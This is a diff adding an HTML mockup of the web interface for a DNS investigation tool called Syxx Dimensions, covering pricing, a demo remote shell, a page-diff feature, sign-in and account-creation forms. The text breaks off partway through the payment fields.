@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Syxx Dimensions</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@500;600;700&family=EB+Garamond:ital,wght@0,400;0,500;1,400;1,500&display=swap" rel="stylesheet">
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;background:radial-gradient(130% 80% at 15% 0%,#1a0c33 0%,#0b0518 55%);font-family:system-ui,-apple-system,sans-serif;min-height:100vh;padding:44px 56px 100px;color:#c9c1e6}
+  a{color:#a78bff;text-decoration:none}
+  a:hover{color:#c4b3ff}
+  ::-webkit-scrollbar{width:10px;height:10px}
+  ::-webkit-scrollbar-thumb{background:rgba(124,92,255,.25);border-radius:8px}
+  .btn{cursor:pointer;transition:all .15s}
+  .btn:hover{filter:brightness(1.09);transform:translateY(-2px)}
+  .nav{cursor:pointer;transition:all .14s}
+  .nav:hover{color:#efeafe}
+  .page{display:none}
+  .page.on{display:block}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+  .cursor{display:inline-block;width:8px;height:15px;background:#2dd4bf;vertical-align:-2px;animation:blink 1.1s step-end infinite}
+  .cmd{cursor:pointer;transition:all .12s}
+  .cmd:hover{background:rgba(124,92,255,.16);border-color:#7c5cff}
+  .osc{cursor:pointer;padding:6px 13px;border-radius:8px;font:600 12px system-ui;color:#b3a7d6;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);transition:all .14s}
+  .osc.on{color:#fff;background:rgba(124,92,255,.22);border-color:#7c5cff}
+  input:focus{border-color:#7c5cff !important}
+  input::placeholder{color:#5f567f}
+</style>
+</head>
+<body>
+  <div style="max-width:560px;margin-bottom:22px">
+    <div style="font:700 11px system-ui;letter-spacing:.28em;text-transform:uppercase;color:#8a6ef0">Syxx · Web GUI Mockup</div>
+    <div style="font:600 25px 'Cinzel',serif;color:#efeafe;margin:7px 0 4px">Served From syxx.app</div>
+    <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:13px;color:#9a8fc0">The window chrome adapts to your operating system, then leads into accounts, payment, and a zero-knowledge identity store.</div>
+  </div>
+
+  <!-- ===== OS PREVIEW SWITCHER ===== -->
+  <div id="osswitch" style="display:flex;gap:8px;align-items:center;margin-bottom:14px">
+    <span style="font:600 10px system-ui;letter-spacing:.2em;text-transform:uppercase;color:#8f83b8">Window chrome</span>
+    <span class="osc" data-os="mac" onclick="setOS('mac')">macOS</span>
+    <span class="osc" data-os="win" onclick="setOS('win')">Windows</span>
+    <span class="osc" data-os="linux" onclick="setOS('linux')">Ubuntu</span>
+    <span id="osdetect" style="font-family:'EB Garamond',serif;font-style:italic;font-size:12px;color:#6f6597"></span>
+  </div>
+
+  <!-- ===== BROWSER WINDOW ===== -->
+  <div style="width:1320px;border-radius:14px;overflow:hidden;background:#0d0720;box-shadow:0 44px 130px rgba(0,0,0,.6),0 0 0 1px rgba(148,120,246,.14)">
+    <div id="chrome"></div>
+
+    <!-- SITE NAV -->
+    <div style="display:flex;align-items:center;gap:26px;padding:16px 34px;border-bottom:1px solid rgba(148,120,246,.12);background:rgba(15,8,28,.5)">
+      <div style="display:flex;align-items:center;gap:11px">
+        <img src="assets/syxx-logo.png" width="40" height="40" alt="Syxx" style="filter:drop-shadow(0 0 8px rgba(255,45,120,.3))">
+        <div style="line-height:1"><div style="font:700 20px 'Cinzel',serif;background:linear-gradient(90deg,#ff9a3d,#ff2d78,#9a5cff);-webkit-background-clip:text;background-clip:text;color:transparent">Syxx</div><div style="font:600 13px 'Cinzel',serif;color:#c4b3ff;margin-top:2px">Dimensions</div></div>
+      </div>
+      <span class="nav" id="nav-account" onclick="show('manage')" style="display:none;align-items:center;gap:7px;margin-left:6px;padding:8px 14px;border-radius:10px;background:rgba(124,92,255,.14);border:1px solid rgba(160,140,255,.3);color:#c4b3ff;font:600 12.5px system-ui;cursor:pointer">◑ Account</span>
+      <div style="flex:1"></div>
+      <span class="nav" style="font:600 13.5px system-ui;color:#efeafe" onclick="show('cover')">Home</span>
+      <span class="nav" style="font:600 13.5px system-ui;color:#b3a7d6" onclick="show('warp')">Warp</span>
+      <span class="nav" style="font:600 13.5px system-ui;color:#b3a7d6" onclick="show('cover')">Pricing</span>
+      <span class="nav" style="font:600 13.5px system-ui;color:#b3a7d6" onclick="show('privacy')">Privacy</span>
+      <span class="nav" style="font:600 13.5px system-ui;color:#b3a7d6" onclick="show('license')">License</span>
+      <span class="nav" style="font:600 13.5px system-ui;color:#efeafe" onclick="show('signin')">Sign In</span>
+      <span class="btn" style="padding:9px 18px;border-radius:10px;background:linear-gradient(120deg,#7c5cff,#5b3fd6);color:#fff;font:600 13px system-ui;box-shadow:0 8px 20px rgba(124,92,255,.4)" onclick="show('create')">Create Account</span>
+    </div>
+
+    <div style="height:860px;overflow-y:auto">
+
+      <!-- ============ COVER ============ -->
+      <section id="cover" class="page on" style="padding:44px 48px 54px">
+        <div style="text-align:center;max-width:720px;margin:0 auto 8px">
+          <div style="font:700 44px 'Cinzel',serif;line-height:1.05;color:#efeafe">Syxx</div>
+          <div style="font:600 30px 'Cinzel',serif;background:linear-gradient(90deg,#ff9a3d,#ff2d78,#9a5cff);-webkit-background-clip:text;background-clip:text;color:transparent;margin-top:4px">Dimensions</div>
+          <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:18px;color:#9a8fc0;margin-top:14px">A DNS investigative and protection suite.</div>
+          <div style="font-size:14.5px;color:#b3a7d6;max-width:560px;margin:14px auto 0;line-height:1.55">Every resolver tells a story. Syxx traces DNS lookups end to end — spoofed answers, poisoned caches, silent exfiltration — and writes your resolver's story.</div>
+        </div>
+
+        <!-- downloads -->
+        <div style="display:flex;justify-content:center;gap:12px;margin:28px 0 8px">
+          <a id="dl-mac" class="btn" href="#" style="display:flex;align-items:center;gap:10px;padding:12px 22px;border-radius:12px;background:rgba(255,255,255,.04);border:1px solid rgba(148,120,246,.24);color:#efeafe;font:600 14px system-ui"><span style="font-size:15px"></span>Download for macOS</a>
+          <a id="dl-win" class="btn" href="#" style="display:flex;align-items:center;gap:10px;padding:12px 22px;border-radius:12px;background:rgba(255,255,255,.04);border:1px solid rgba(148,120,246,.24);color:#efeafe;font:600 14px system-ui"><span style="font-size:15px">⊞</span>Windows</a>
+          <a id="dl-linux" class="btn" href="#" style="display:flex;align-items:center;gap:10px;padding:12px 22px;border-radius:12px;background:rgba(255,255,255,.04);border:1px solid rgba(148,120,246,.24);color:#efeafe;font:600 14px system-ui"><span style="font-size:15px">🐧</span>Ubuntu (Mint)</a>
+        </div>
+        <div style="text-align:center;font-family:ui-monospace,monospace;font-size:11.5px;color:#6f6597;margin-bottom:34px">v0.9 · .NET 10 · free local checks, forever<span id="osnote" style="color:#8a6ef0"></span></div>
+
+        <!-- pricing -->
+        <div style="font:700 10px system-ui;letter-spacing:.22em;color:#8f83b8;text-transform:uppercase;text-align:center;margin-bottom:14px">Upgrade to Pro</div>
+        <div style="display:flex;justify-content:center;gap:16px;margin-bottom:40px">
+          <div style="width:300px;border-radius:16px;padding:22px 24px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.16)">
+            <div style="font:600 17px 'Cinzel',serif;color:#efeafe">Monthly</div>
+            <div style="font:600 34px 'Cinzel',serif;color:#efeafe;margin:8px 0 2px">$3.95<span style="font-size:14px;color:#8f83b8;font-family:system-ui"> / month</span></div>
+            <div style="font-size:12.5px;color:#9a8fc0;margin-bottom:16px">Billed monthly. Cancel anytime.</div>
+            <a class="btn" href="#" style="display:block;text-align:center;padding:11px;border-radius:11px;background:rgba(124,92,255,.16);border:1px solid rgba(160,140,255,.35);color:#c4b3ff;font:600 13px system-ui" onclick="selPlan('monthly');show('create');return false">Subscribe monthly</a>
+          </div>
+          <div style="width:300px;border-radius:16px;padding:22px 24px;background:linear-gradient(160deg,rgba(124,92,255,.16),rgba(45,212,191,.05));border:1px solid rgba(160,140,255,.4);box-shadow:0 0 40px rgba(124,92,255,.15);position:relative">
+            <span style="position:absolute;top:-11px;left:24px;padding:4px 11px;border-radius:999px;background:#e0b45a;color:#241800;font:700 9px system-ui;letter-spacing:.1em;text-transform:uppercase">Best value · save 58%</span>
+            <div style="font:600 17px 'Cinzel',serif;color:#efeafe">Yearly</div>
+            <div style="font:600 34px 'Cinzel',serif;color:#efeafe;margin:8px 0 2px">$19.95<span style="font-size:14px;color:#8f83b8;font-family:system-ui"> / year</span></div>
+            <div style="font-size:12.5px;color:#9a8fc0;margin-bottom:16px">Billed annually. Wakes all three server wardens.</div>
+            <a class="btn" href="#" style="display:block;text-align:center;padding:11px;border-radius:11px;background:#7c5cff;color:#fff;font:600 13px system-ui;box-shadow:0 10px 26px rgba(124,92,255,.45)" onclick="selPlan('yearly');show('create');return false">Subscribe yearly</a>
+          </div>
+        </div>
+
+        <!-- remote shell -->
+        <div style="max-width:960px;margin:0 auto">
+          <div style="display:flex;align-items:baseline;gap:12px;margin-bottom:10px"><div style="font:700 10px system-ui;letter-spacing:.22em;color:#8f83b8;text-transform:uppercase">Remote Shell</div><div style="font-family:'EB Garamond',serif;font-style:italic;font-size:13px;color:#8f83b8">Run the vantage-dependent modules from the server instead of your machine.</div></div>
+          <div id="term-frame" style="border-radius:14px;overflow:hidden;background:#07040f;border:1px solid rgba(148,120,246,.2);box-shadow:0 30px 80px rgba(0,0,0,.5)">
+            <div id="term-bar" style="height:34px;display:flex;align-items:center;gap:9px;padding:0 14px;background:rgba(20,14,32,.9);border-bottom:1px solid rgba(148,120,246,.14)"><span id="term-dots" style="display:flex;gap:6px"><span style="width:10px;height:10px;border-radius:50%;background:#ff5f57"></span><span style="width:10px;height:10px;border-radius:50%;background:#febc2e"></span><span style="width:10px;height:10px;border-radius:50%;background:#28c840"></span></span><span id="term-title" style="flex:1;text-align:center;font-family:ui-monospace,monospace;font-size:12px;color:#8f83b8">syxx@dimensions — remote shell — ssh syxx.app</span></div>
+            <div id="term" style="padding:16px 18px;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12.5px;line-height:1.6;color:#c9c1e6;height:220px;overflow-y:auto;white-space:pre-wrap"></div>
+          </div>
+          <div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:12px">
+            <span class="cmd" style="padding:7px 13px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:ui-monospace,monospace;font-size:12px;color:#a78bff" onclick="run('prophet')">syxx prophet</span>
+            <span class="cmd" style="padding:7px 13px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:ui-monospace,monospace;font-size:12px;color:#a78bff" onclick="run('mirror')">syxx mirror <span style="color:#e0b45a">pro</span></span>
+            <span class="cmd" style="padding:7px 13px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:ui-monospace,monospace;font-size:12px;color:#a78bff" onclick="run('warp')">syxx warp <span style="color:#e0b45a">pro</span></span>
+            <span class="cmd" style="padding:7px 13px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:ui-monospace,monospace;font-size:12px;color:#a78bff" onclick="run('conclude')">syxx conclude</span>
+            <span class="cmd" style="padding:7px 13px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:ui-monospace,monospace;font-size:12px;color:#8f83b8" onclick="run('help')">help</span>
+          </div>
+          <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:12.5px;color:#6f6597;margin-top:10px">Portal, Glutton, and Cage read your local network and can only run inside the desktop app — they gain nothing from a remote vantage.</div>
+        </div>
+      </section>
+
+      <!-- ============ WARP ============ -->
+      <section id="warp" class="page" style="padding:34px 40px 50px">
+        <div style="display:flex;align-items:baseline;gap:12px;margin-bottom:4px"><span style="width:30px;height:30px;border-radius:8px;display:grid;place-items:center;background:rgba(124,92,255,.14);color:#a78bff;font-size:16px">⇌</span><div style="font:600 26px 'Cinzel',serif;color:#efeafe">Warp <span style="font:700 10px system-ui;letter-spacing:.1em;color:#e0b45a;vertical-align:middle">PRO</span></div></div>
+        <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:15px;color:#9a8fc0;max-width:760px;margin-bottom:18px">Pull a page's HTML, CSS, and JavaScript as plain text from the syxx.app vantage and from your own device at the same instant — then diff them line by line to reveal what the network rewrote in transit.</div>
+
+        <!-- url bar -->
+        <div style="display:flex;gap:10px;margin-bottom:16px;max-width:820px">
+          <div style="flex:1;display:flex;align-items:center;gap:10px;padding:10px 15px;border-radius:10px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.2)"><span style="color:#2dd4bf;font-size:12px">🔒</span><span style="font-family:ui-monospace,monospace;font-size:13px;color:#efeafe">https://example-bank.com/login</span></div>
+          <span class="btn" style="padding:10px 22px;border-radius:10px;background:linear-gradient(120deg,#7c5cff,#5b3fd6);color:#fff;font:600 13px system-ui;box-shadow:0 8px 20px rgba(124,92,255,.4)">Warp &amp; Diff</span>
+        </div>
+
+        <!-- two terminals -->
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+          <!-- remote -->
+          <div style="border-radius:13px;overflow:hidden;background:#07040f;border:1px solid rgba(45,212,191,.28)">
+            <div style="display:flex;align-items:center;gap:9px;padding:9px 14px;background:rgba(45,212,191,.06);border-bottom:1px solid rgba(45,212,191,.18)"><span style="width:9px;height:9px;border-radius:50%;background:#2dd4bf;box-shadow:0 0 8px #2dd4bf"></span><span style="font:600 11px system-ui;letter-spacing:.08em;text-transform:uppercase;color:#2dd4bf">Remote · via syxx.app</span><span style="flex:1"></span><span style="font-family:ui-monospace,monospace;font-size:10.5px;color:#6f6597">198.71.60.193</span></div>
+            <pre id="remoteSrc" style="margin:0;padding:14px 16px;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:11.5px;line-height:1.65;color:#c9c1e6;height:300px;overflow:auto;white-space:pre"></pre>
+          </div>
+          <!-- local -->
+          <div style="border-radius:13px;overflow:hidden;background:#07040f;border:1px solid rgba(124,92,255,.28)">
+            <div style="display:flex;align-items:center;gap:9px;padding:9px 14px;background:rgba(124,92,255,.06);border-bottom:1px solid rgba(124,92,255,.18)"><span style="width:9px;height:9px;border-radius:50%;background:#a78bff;box-shadow:0 0 8px #a78bff"></span><span style="font:600 11px system-ui;letter-spacing:.08em;text-transform:uppercase;color:#b9a9ff">Local · your device</span><span style="flex:1"></span><span style="font-family:ui-monospace,monospace;font-size:10.5px;color:#6f6597">192.168.1.24</span></div>
+            <pre id="localSrc" style="margin:0;padding:14px 16px;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:11.5px;line-height:1.65;color:#c9c1e6;height:300px;overflow:auto;white-space:pre"></pre>
+          </div>
+        </div>
+
+        <!-- diff summary + controls -->
+        <div style="display:flex;align-items:center;gap:16px;margin-top:14px;flex-wrap:wrap">
+          <div style="display:flex;align-items:center;gap:9px;padding:10px 16px;border-radius:11px;background:rgba(255,77,109,.08);border:1px solid rgba(255,77,109,.3)"><span style="font-size:16px">⚠</span><span style="font-size:13px;color:#f0b8c2"><b style="color:#ff4d6d">2 differences</b> found — the remote copy injected a script and altered a form action not present on your device.</span></div>
+          <span style="display:inline-flex;align-items:center;gap:6px;font-size:11.5px;color:#8f83b8"><span style="width:11px;height:11px;border-radius:3px;background:rgba(255,77,109,.35)"></span>remote-only</span>
+          <span style="display:inline-flex;align-items:center;gap:6px;font-size:11.5px;color:#8f83b8"><span style="width:11px;height:11px;border-radius:3px;background:rgba(45,212,191,.3)"></span>local-only</span>
+          <span style="flex:1"></span>
+          <span class="btn" style="padding:9px 18px;border-radius:10px;background:rgba(124,92,255,.16);border:1px solid rgba(160,140,255,.35);color:#c4b3ff;font:600 12.5px system-ui">Inspect line-by-line</span>
+        </div>
+      </section>
+
+      <!-- ============ LICENSE ============ -->
+      <section id="license" class="page" style="padding:34px 48px 54px">
+        <div style="max-width:820px;margin:0 auto">
+          <div style="font:700 10px system-ui;letter-spacing:.22em;color:#8a6ef0;text-transform:uppercase">Legal</div>
+          <div style="font:600 28px 'Cinzel',serif;color:#efeafe;margin:8px 0 4px">End-User License Agreement</div>
+          <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:14px;color:#9a8fc0;margin-bottom:22px">The same terms you accept on first run of the app.</div>
+          <div id="eula" style="font-family:'EB Garamond',serif;font-size:15px;line-height:1.6;color:#c9c1e6"></div>
+        </div>
+      </section>
+
+      <!-- ============ MEMBERS TERMINAL ============ -->
+      <section id="members" class="page" style="padding:34px 40px 46px">
+        <div style="display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:18px;flex-wrap:wrap">
+          <div>
+            <div style="font:700 10px system-ui;letter-spacing:.22em;color:#8a6ef0;text-transform:uppercase">Members Area</div>
+            <div style="font:600 26px 'Cinzel',serif;color:#efeafe;margin-top:6px">Remote Terminal</div>
+            <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:13px;color:#9a8fc0;margin-top:2px">Signed in as <span id="mem-email">••••••</span> · run the DNS wardens and tooling from the syxx.app vantage.</div>
+          </div>
+          <div style="display:flex;align-items:center;gap:10px"><span id="mem-plan" style="padding:7px 14px;border-radius:999px;background:rgba(224,180,90,.16);border:1px solid rgba(224,180,90,.4);color:#e0b45a;font:700 11px system-ui;letter-spacing:.08em">PRO</span><span class="btn" onclick="signOut()" style="padding:8px 15px;border-radius:10px;background:rgba(255,255,255,.04);border:1px solid rgba(148,120,246,.24);color:#c9c1e6;font:600 12px system-ui;cursor:pointer">Sign out</span></div>
+        </div>
+
+        <!-- variable bar -->
+        <div style="display:flex;gap:10px;align-items:center;margin-bottom:14px;flex-wrap:wrap">
+          <div style="flex:1;min-width:260px;display:flex;align-items:center;gap:9px;padding:9px 14px;border-radius:10px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.22)"><span style="font:600 9px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8">Domain</span><input id="m-domain" placeholder="github.com" style="flex:1;background:transparent;border:none;outline:none;color:#efeafe;font-family:ui-monospace,monospace;font-size:13.5px"></div>
+          <div style="display:flex;align-items:center;gap:9px;padding:9px 14px;border-radius:10px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.22)"><span style="font:600 9px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8">Type</span><select id="m-type" style="background:transparent;border:none;outline:none;color:#efeafe;font-family:ui-monospace,monospace;font-size:13.5px"><option style="color:#000">A</option><option style="color:#000">AAAA</option><option style="color:#000">MX</option><option style="color:#000">TXT</option><option style="color:#000">NS</option><option style="color:#000">CNAME</option><option style="color:#000">SOA</option><option style="color:#000">CAA</option></select></div>
+          <span class="btn" onclick="mclear()" style="padding:9px 15px;border-radius:10px;background:rgba(255,255,255,.04);border:1px solid rgba(148,120,246,.24);color:#c9c1e6;font:600 12px system-ui;cursor:pointer">Clear</span>
+        </div>
+
+        <!-- command palette -->
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:14px">
+          <div style="border-radius:12px;background:rgba(255,255,255,.02);border:1px solid rgba(148,120,246,.14);padding:13px 14px">
+            <div style="font:700 9px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8;margin-bottom:9px">Remote wardens</div>
+            <div style="display:flex;flex-wrap:wrap;gap:8px">
+              <span class="cmd" onclick="runCmd('prophet')" style="padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:ui-monospace,monospace;font-size:12px;color:#a78bff">prophet</span>
+              <span class="cmd" onclick="runCmd('mirror')" style="padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:ui-monospace,monospace;font-size:12px;color:#a78bff">mirror <span style="color:#e0b45a">pro</span></span>
+              <span class="cmd" onclick="runCmd('warp')" style="padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:ui-monospace,monospace;font-size:12px;color:#a78bff">warp <span style="color:#e0b45a">pro</span></span>
+              <span class="cmd" onclick="runCmd('conclude')" style="padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:ui-monospace,monospace;font-size:12px;color:#a78bff">conclude</span>
+            </div>
+          </div>
+          <div style="border-radius:12px;background:rgba(255,255,255,.02);border:1px solid rgba(148,120,246,.14);padding:13px 14px">
+            <div style="font:700 9px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8;margin-bottom:9px">DNS tools</div>
+            <div style="display:flex;flex-wrap:wrap;gap:8px">
+              <span class="cmd" onclick="runCmd('nslookup')" style="padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:ui-monospace,monospace;font-size:12px;color:#2dd4bf">nslookup</span>
+              <span class="cmd" onclick="runCmd('dig')" style="padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:ui-monospace,monospace;font-size:12px;color:#2dd4bf">dig</span>
+              <span class="cmd" onclick="runCmd('dnstwist')" style="padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:ui-monospace,monospace;font-size:12px;color:#2dd4bf">dnstwist</span>
+              <span class="cmd" onclick="runCmd('whois')" style="padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:ui-monospace,monospace;font-size:12px;color:#2dd4bf">whois</span>
+              <span class="cmd" onclick="runCmd('dnssec')" style="padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:ui-monospace,monospace;font-size:12px;color:#2dd4bf">dnssec</span>
+              <span class="cmd" onclick="runCmd('help')" style="padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:ui-monospace,monospace;font-size:12px;color:#8f83b8">help</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- terminal -->
+        <div style="border-radius:14px;overflow:hidden;background:#07040f;border:1px solid rgba(148,120,246,.2);box-shadow:0 30px 80px rgba(0,0,0,.5)">
+          <div style="height:34px;display:flex;align-items:center;gap:9px;padding:0 14px;background:rgba(20,14,32,.9);border-bottom:1px solid rgba(148,120,246,.14)"><span style="display:flex;gap:6px"><span style="width:10px;height:10px;border-radius:50%;background:#ff5f57"></span><span style="width:10px;height:10px;border-radius:50%;background:#febc2e"></span><span style="width:10px;height:10px;border-radius:50%;background:#28c840"></span></span><span style="flex:1;text-align:center;font-family:ui-monospace,monospace;font-size:12px;color:#8f83b8">syxx@dimensions — members shell — restricted DNS command set</span></div>
+          <div id="mterm" style="padding:16px 18px;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12.5px;line-height:1.6;color:#c9c1e6;height:300px;overflow-y:auto;white-space:pre-wrap"></div>
+        </div>
+        <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:12.5px;color:#6f6597;margin-top:10px">This is a governed shell: only the DNS commands above will run — pick one and it uses the domain and type you set. Portal, Glutton, and Cage read your local network and stay inside the desktop app.</div>
+      </section>
+
+      <!-- ============ ENTER (SIGN IN) ============ -->
+      <section id="signin" class="page" style="padding:52px 48px 60px">
+        <div style="max-width:430px;margin:0 auto;text-align:center">
+          <span style="display:inline-grid;place-items:center;width:46px;height:46px;border-radius:12px;background:rgba(124,92,255,.14);color:#a78bff;font-size:22px">⟡</span>
+          <div style="font:600 28px 'Cinzel',serif;color:#efeafe;margin:16px 0 4px">Enter Syxx Dimensions</div>
+          <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:14px;color:#9a8fc0;margin-bottom:26px">Your passphrase unseals your identity on this device — the server never receives it.</div>
+          <div style="text-align:left;display:flex;flex-direction:column;gap:16px">
+            <div><label style="display:block;font:600 10.5px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8;margin-bottom:8px">Email</label><input id="si-email" type="email" placeholder="you@example.com" style="width:100%;padding:11px 14px;border-radius:10px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.22);color:#efeafe;font:400 14px system-ui;outline:none"></div>
+            <div><label style="display:block;font:600 10.5px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8;margin-bottom:8px">Passphrase</label><input id="si-pass" type="password" placeholder="••••••••••••" style="width:100%;padding:11px 14px;border-radius:10px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.22);color:#efeafe;font:400 14px system-ui;outline:none"></div>
+            <span class="btn" onclick="doSignin()" style="display:block;text-align:center;padding:13px;border-radius:12px;background:linear-gradient(120deg,#7c5cff,#5b3fd6);color:#fff;font:600 14px system-ui;box-shadow:0 12px 30px rgba(124,92,255,.4);cursor:pointer">Enter</span>
+          </div>
+          <div style="margin-top:18px;font-size:12.5px;color:#8f83b8">No account yet? <a href="#" onclick="show('create');return false">Create one</a></div>
+          <div style="margin-top:8px;font-family:'EB Garamond',serif;font-style:italic;font-size:12px;color:#6f6597;line-height:1.5">Because we can't read your identity, we can't reset your passphrase — keep the recovery kit issued at signup.</div>
+        </div>
+      </section>
+
+      <!-- ============ CREATE ACCOUNT ============ -->
+      <section id="create" class="page" style="padding:40px 48px 56px">
+        <div style="max-width:980px;margin:0 auto">
+          <div style="font:700 10px system-ui;letter-spacing:.22em;color:#8a6ef0;text-transform:uppercase">Membership</div>
+          <div style="font:600 28px 'Cinzel',serif;color:#efeafe;margin:8px 0 4px">Create Account</div>
+          <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:14px;color:#9a8fc0;margin-bottom:26px">$3.95/month or $19.95/year. No permanent licenses — cancel anytime.</div>
+          <div style="display:grid;grid-template-columns:1.08fr .92fr;gap:26px;align-items:start">
+            <div style="display:flex;flex-direction:column;gap:18px">
+              <div><label style="display:block;font:600 10.5px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8;margin-bottom:8px">Email</label><input id="ca-email" type="email" oninput="updateStore()" placeholder="you@example.com" style="width:100%;padding:11px 14px;border-radius:10px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.22);color:#efeafe;font:400 14px system-ui;outline:none"></div>
+              <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px">
+                <div><label style="display:block;font:600 10.5px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8;margin-bottom:8px">Passphrase</label><input type="password" placeholder="••••••••" style="width:100%;padding:11px 14px;border-radius:10px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.22);color:#efeafe;font:400 14px system-ui;outline:none"></div>
+                <div><label style="display:block;font:600 10.5px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8;margin-bottom:8px">Confirm</label><input type="password" placeholder="••••••••" style="width:100%;padding:11px 14px;border-radius:10px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.22);color:#efeafe;font:400 14px system-ui;outline:none"></div>
+              </div>
+              <div>
+                <label style="display:block;font:600 10.5px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8;margin-bottom:8px">Plan</label>
+                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
+                  <div id="plan-monthly" onclick="selPlan('monthly')" style="cursor:pointer;border-radius:12px;padding:14px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);transition:all .14s"><div style="font:600 15px 'Cinzel',serif;color:#efeafe">Monthly</div><div style="font:600 22px 'Cinzel',serif;color:#efeafe;margin-top:3px">$3.95<span style="font-size:12px;color:#8f83b8;font-family:system-ui"> /mo</span></div></div>
+                  <div id="plan-yearly" onclick="selPlan('yearly')" style="cursor:pointer;border-radius:12px;padding:14px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);transition:all .14s"><div style="font:600 15px 'Cinzel',serif;color:#efeafe">Yearly <span style="font:700 8px system-ui;letter-spacing:.08em;color:#e0b45a;vertical-align:middle">SAVE 58%</span></div><div style="font:600 22px 'Cinzel',serif;color:#efeafe;margin-top:3px">$19.95<span style="font-size:12px;color:#8f83b8;font-family:system-ui"> /yr</span></div></div>
+                </div>
+              </div>
+              <div>
+                <label style="display:block;font:600 10.5px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8;margin-bottom:8px">Payment</label>
+                <div style="border-radius:12px;border:1px solid rgba(148,120,246,.22);background:rgba(10,6,20,.5);padding:14px;display:flex;flex-direction:column;gap:12px">
+                  <input placeholder="Card number" style="width:100%;padding:10px 13px;border-radius:9px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.22);color:#efeafe;font-family:ui-monospace,monospace;font-size:13px;outline:none">
+                  <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px">
+                    <input placeholder="MM / YY" style="width:100%;padding:10px 13px;border-radius:9px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.22);color:#efeafe;font-family:ui-monospace,monospace;font-size:13px;outline:none">
+                    <input placeholder="CVC" style="width:100%;padding:10px 13px;border-radius:9px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.22);color:#efeafe;font-family:ui-monospace,monospace;font-size:13px;outline:none">
+                    <input placeholder="ZIP" style="width:100%;padding:10px 13px;border-radius:9px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.22);color:#efeafe;font-family:ui-monospace,monospace;font-size:13px;outline:none">
+                  </div>
